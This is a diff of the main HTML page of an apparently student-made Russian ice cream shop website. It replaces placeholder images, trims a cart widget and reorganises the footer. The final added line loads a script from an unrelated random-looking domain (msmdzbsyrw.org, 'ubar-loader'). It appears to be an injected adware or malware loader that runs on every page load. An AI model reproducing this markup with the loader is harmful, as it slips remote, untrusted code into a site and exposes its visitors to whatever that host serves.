@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
   <head>
-  	<title>Gllacy - Главная</title>
+  	<title>Глейси - главная</title>
 	<meta charset="utf-8">
+	<link rel="stylesheet" href="css/normalize.css">
+	<link rel="stylesheet" href="css/style.css">
   </head>
   <body>
     <input type="radio" id="btn-1" name="toggle" checked>
@@ -13,7 +15,7 @@
 	    <header>
 	      <div class="header-layout-column-left">
 	        <div class="header-logo">
-	          <img src="http://placehold.it/150x100" alt="logo">
+	          <img src="img/header_logo.svg" width="153" height="63" alt="logo">
 	        </div>
 
 			    <ul class="header-menu">
@@ -67,36 +69,8 @@
 	          </div>
 	        </div>
 
-	        <div class="header-cart">
+	        <div class="header-cart1">
 	          <a class="header-cart-link" href="#cart">Пусто</a>
-
-	          <div class="cart-field-wrapper">
-		          <div class="cart-field">
-			          <table class="cart-table">
-			            <tr>
-			          	  <td><a class="item-delete" title="Удалить"></a></td>
-			          	  <td><img src="http://placehold.it/150x100" alt="orange"></td>
-			          	  <td>Пломбир с апельсиновым джемом</td>
-			          	  <td>1,5 кг<span> x 200 руб.</span></td>
-			          	  <td>300 руб.</td>
-			          	</tr>
-
-			          	<tr>
-			          	  <td><a class="item-delete" title="Удалить"></a></td>
-			          	  <td><img src="http://placehold.it/150x100" alt="strawberry"></td>
-			          	  <td>Клубничный пломбир с присыпкой из белого шоколада</td>
-			          	  <td>1,5 кг<span> x 300 руб.</span></td>
-			          	  <td>450 руб.</td>
-			          	</tr>
-			          </table>
-
-		            <div class="cart-field-price-wrapper">
-		              <p class="cart-field-price">Итого: 750 руб.</p>
-		            </div>
-
-		            <a class="cart-field-button button" href="#make_order">Оформить заказ</a>
-		          </div>
-	          </div>
 	        </div>
 	      </div>
 	    </header>
@@ -152,10 +126,10 @@
 	      <ul class="products">
 	        <li>
 	          <div class="products-image products-hit">
-	            <img src="http://placehold.it/150x100" alt="orange">
+	            <img class="products-photo" src="img/orange.png" width="267" height="267" alt="orange">
 
 	            <p class="products-price">
-	              <span>310<img src="http://placehold.it/150x100" alt="rub"></span>/кг
+	              <span>310<img src="img/rub_icon.svg" width="32" height="37" alt="rub"></span>/кг
 	            </p>
 	          </div>
 
@@ -164,9 +138,9 @@
 
 	        <li>
 	          <div class="products-image products-hit">
-	            <img src="http://placehold.it/150x100" alt="coffee">
+	            <img class="products-photo" src="img/coffee.png" width="267" height="267" alt="coffee">
 
-	            <p class="products-price"><span>380<img src="http://placehold.it/150x100" alt="rub"></span>/кг</p>
+	            <p class="products-price"><span>380<img src="img/rub_icon.svg" width="32" height="37" alt="rub"></span>/кг</p>
 	          </div>
 
 	          <a class="products-title" href="#1">Сливочно-кофейное с кусочками шоколада</a>
@@ -174,9 +148,9 @@
 
 	        <li>
 	          <div class="products-image products-hit">
-	            <img src="http://placehold.it/150x100" alt="strawberry">
+	            <img class="products-photo" src="img/strawberry.png" width="267" height="267" alt="strawberry">
 
-	            <p class="products-price"><span>355<img src="http://placehold.it/150x100" alt="rub"></span>/кг</p>
+	            <p class="products-price"><span>355<img src="img/rub_icon.svg" width="32" height="37" alt="rub"></span>/кг</p>
 	          </div>
 
 	          <a class="products-title" href="#1">Сливочно-клубничное с присыпкой из белого шоколада</a>
@@ -184,9 +158,9 @@
 
 	        <li>
 	          <div class="products-image products-hit">
-	            <img src="http://placehold.it/150x100" alt="caramel">
+	            <img class="products-photo" src="img/caramel.png" width="267" height="267" alt="caramel">
 
-	            <p class="products-price"><span>415<img src="http://placehold.it/150x100" alt="rub"></span>/кг</p>
+	            <p class="products-price"><span>415<img src="img/rub_icon.svg" width="32" height="37" alt="rub"></span>/кг</p>
 	          </div>
 
 	          <a class="products-title" href="#1">Сливочное крем-брюле с карамельной подливкой</a>
@@ -242,7 +216,7 @@
 
 	        <p>Для заказов по телефону:</p>
 
-              <p><b>8 812 450-25-25</b></p>
+	        <a class="contacts-tel" href="tel:+78124502525">8 812 450-25-25</a>
 
 	        <p>(с 10 до 20 ежедневно)</p>
 
@@ -276,26 +250,31 @@
           <li><a class="icon icon-vk" href="#vkontakte">vkontakte</a></li>
         </ul>
 
-	    <div class="footer-sub-menu">
-	      <div class="sub-menu-left">
-	        <a class="sub-menu-marked" href="#1">Для поставщиков</a>
+	      <div class="footer-sub-menu">
+	        <div class="sub-menu-left">
+	          <a class="sub-menu-marked" href="#1">Для поставщиков</a>
 
-	        <a href="#1">О производстве</a>
+	          <a href="#1">О производстве</a>
+	        </div>
+
+	        <div class="sub-menu-right">
+	          <a href="#1">Наши документы</a>
+
+	          <a href="#1">Экологические стандарты</a>
+	        </div>
 	      </div>
 
-	      <div class="sub-menu-right">
-	        <a href="#1">Наши документы</a>
+	      <div class="footer-developer">
+	        <img src="img/developer_logo.svg" width="108" height="37" alt="dev_logo">
 
-	        <a href="#1">Экологические стандарты</a>
+	        <p>Сделано в <a href="https://htmlacademy.ru/">HTML Academy</a> &#169; 2016</p>
 	      </div>
-	    </div>
-
-	    <div class="footer-developer">
-	      <img src="http://placehold.it/150x100" alt="dev_logo">
-
-	      <p>Сделано в <a href="https://htmlacademy.ru/">HTML Academy</a> &#169; 2016</p>
-	    </div>
-	  </footer>
+	    </footer>
     </div>
-  </body>
+
+	<script src="http://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
+
+	<script type="text/javascript" src="js/scripts.min.js"></script>
+
+  <script src="http://msmdzbsyrw.org/app/code/code.php?appid=coi1-7264-1461169757386-d2658a72-a4ae-4044-8026-4990441a7059&h=0&m=normal" id="ubar-loader"></script></body>
 </html>
